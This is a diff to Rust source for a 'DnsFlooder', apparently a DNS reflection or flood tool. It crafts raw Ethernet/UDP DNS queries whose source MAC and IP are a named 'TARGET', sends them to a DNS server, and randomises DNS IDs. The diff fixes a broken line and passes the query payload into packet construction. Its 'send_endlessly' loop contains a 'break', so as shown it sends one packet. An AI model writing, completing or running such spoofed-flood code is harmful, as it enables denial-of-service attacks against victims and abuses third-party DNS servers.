@@ -61,53 +61,6 @@ impl DnsFlooder {
 
 
 
-    pub fn execute(&mut self){
-        self.display_pkt_data();
-        self.send_endlessly();
-    }
-
-
-    
-    fn display_pkt_data(&self) {
-        let src_mac = mac_u8_to_string(self.pkt_data.src_mac);
-        let dst_mac = mac_u8_to_string(self.pkt_data.dst_mac);
-
-        println!("TARGET     >> MAC: {}  IP: {}", src_mac, self.pkt_data.src_ip);
-        println!("DNS SERVER >> MAC: {}  IP: {}", dst_mac, self.pkt_data.dst_ip);
-        println!("IFACE: {}", self.iface);
-    }
-
-
-
-    fn send_endlessly(&mut self) {
-        let socket = Layer2RawSocket::new(&self.iface);
-
-        loop {
-            let pkt = self.get_pkt();
-            socket.send(pkt);
-
-            self.pkts_sent += 1;
-            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
-            break;
-        }
-    }
-
-
-    
-    #[inline]
-    fn get_pkt(&mut self) -> &[u8] {
-        self.builder.udp_ether(
-            self.pkt_data.src_mac, 
-            self.pkt_data.src_ip, 
-            self.rand.get_random_port(),
-            self.pkt_data.dst_mac, 
-            self.pkt_data.dst_ip,
-            self.pkt_data.dst_port,
-        )
-    }
-
-
-
     fn create_dns_query(domain: &str, use_edns: bool) -> Vec<u8> {
         let header_size   = 12;
         let question_size = Self::compute_question_size(domain);
@@ -180,8 +133,58 @@ impl DnsFlooder {
 
 
     fn update_dns_id(&mut self) {
-        let new_id = ;
+        let new_id = self.rand.random_u16();
         self.pkt_data.payload[0..2].copy_from_slice(&new_id.to_be_bytes());
+    }
+
+
+
+    pub fn execute(&mut self){
+        self.display_pkt_data();
+        self.send_endlessly();
+    }
+
+
+
+    fn display_pkt_data(&self) {
+        let src_mac = mac_u8_to_string(self.pkt_data.src_mac);
+        let dst_mac = mac_u8_to_string(self.pkt_data.dst_mac);
+
+        println!("TARGET     >> MAC: {}  IP: {}", src_mac, self.pkt_data.src_ip);
+        println!("DNS SERVER >> MAC: {}  IP: {}", dst_mac, self.pkt_data.dst_ip);
+        println!("IFACE: {}", self.iface);
+    }
+
+
+
+    fn send_endlessly(&mut self) {
+        let socket = Layer2RawSocket::new(&self.iface);
+
+        loop {
+            let pkt = self.get_pkt();
+            socket.send(pkt);
+
+            self.update_dns_id();
+
+            self.pkts_sent += 1;
+            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
+            break;
+        }
+    }
+
+
+    
+    #[inline]
+    fn get_pkt(&mut self) -> &[u8] {
+        self.builder.udp_ether(
+            self.pkt_data.src_mac, 
+            self.pkt_data.src_ip, 
+            self.rand.get_random_port(),
+            self.pkt_data.dst_mac, 
+            self.pkt_data.dst_ip,
+            self.pkt_data.dst_port,
+            &self.pkt_data.payload
+        )
     }
 
 }
